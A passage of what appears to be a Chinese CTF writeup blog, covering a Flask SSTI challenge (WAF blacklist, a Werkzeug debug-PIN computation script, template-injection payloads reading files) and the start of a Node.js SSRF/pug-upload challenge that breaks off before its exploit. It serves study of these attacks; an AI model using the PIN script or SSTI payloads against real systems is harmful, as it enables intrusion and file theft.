class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;解密&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;SECRET_KEY&#39;] &#x3D; &#39;s_e_c_r_e_t_k_e_y&#39;</span><br></pre></td></tr></table></figure><p>重点在waf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>可见过滤了命令执行常用函数，不能采用命令执行的方式。</p><p>继续读一下必要信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">username #读取&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;&#x2F;本题：flaskweb</span><br><span class="line">modname  #flask.app</span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))为Flask</span><br><span class="line">getattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径</span><br><span class="line">&#x2F;&#x2F;本题通过报错得到路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</span><br><span class="line">uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</span><br><span class="line">&#x2F;&#x2F;获取方式：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line">&#x2F;&#x2F;本题：02:42:ac:10:af:49 转化为十进制(python print(0x0242ac10af49)) 2485377871689</span><br><span class="line">get_machine_id()</span><br><span class="line">&#x2F;&#x2F;读取&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</span><br><span class="line">&#x2F;&#x2F;windows读取注册表：SOFTWARE\\Microsoft\\Cryptography</span><br><span class="line">&#x2F;&#x2F;docker下：&#x2F;proc&#x2F;self&#x2F;cgroup</span><br><span class="line">&#x2F;&#x2F;本题：0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8</span></span><br><span class="line"><span class="comment"># From https://xz.aliyun.com/t/2553</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377871689&#x27;</span>,<span class="comment">#str(uuid.getnode()), /sys/class/net/ens0/address</span></span><br><span class="line">    <span class="string">&#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>信息修改完整后运行得到 pin码：<code>410-898-797</code></p><p>读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;cat /this_is_the_flag.txt&#x27;</span>).readlines()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419200901.png" alt="image-20210419200900612"></p><p>有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419210056.png" alt="image-20210419210055982"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; </span><br><span class="line">c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1], &#39;r&#39;).read()</span><br><span class="line">&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419201816.png" alt="image-20210419201816421"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-GYCTF2020</title>
      <link href="2021/04/19/BUUCTF-GYCTF2020/"/>
      <url>2021/04/19/BUUCTF-GYCTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="BUUCTF-GYCTF2020"><a href="#BUUCTF-GYCTF2020" class="headerlink" title="BUUCTF-GYCTF2020"></a>BUUCTF-GYCTF2020</h2><h3 id="WEB-Node-Game"><a href="#WEB-Node-Game" class="headerlink" title="[WEB]Node Game"></a>[WEB]Node Game</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>可以查看源码，代码审计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).array(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">app.use(morgan(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.use(<span class="string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">&quot;/&quot;</span>) || action.includes(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/core&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>通过审计发现存在以下功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;&#39; &#x2F;&#x2F;index</span><br><span class="line">post &#x2F;file_upload &#x2F;&#x2F;文件上传</span><br><span class="line">get &#x2F;source &#x2F;&#x2F;查看源码</span><br><span class="line">get &#x2F;core &#x2F;&#x2F;存在SSRF</span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>核心代码分析：</p><p>get /core 存在SSRF，对我们传入的q参数进行拼接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q</span><br></pre></td></tr></table></figure><p>然后通过<code>blacklist</code>函数进行验证，<code>blacklist</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对敏感函数进行了过滤。</p><p>post /file_upload 是个文件上传的地方，需要满足以下条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.includes(&#39;127.0.0.1&#39;)</span><br></pre></td></tr></table></figure><p>首页还存在提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417203837.png" alt="image-20210417203836999"></p><p>存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。</p><p>提示了pug，同时模板渲染采用的是pug引擎：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417204312.png" alt="image-20210417204312204"></p><p>看一下<a href="https://pugjs.org/zh-cn/language/includes.html"> pug 引擎文档：</a></p><p>从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//- index.pug</span></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include style.css</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>构造post请求，采用抓包的方法获取上传请求：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205203.png" alt="image-20210417205203592"></p><p>直接上传会提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205422.png" alt="image-20210417205421796"></p><p>构造exp：利用nodejs ssrf构造post请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 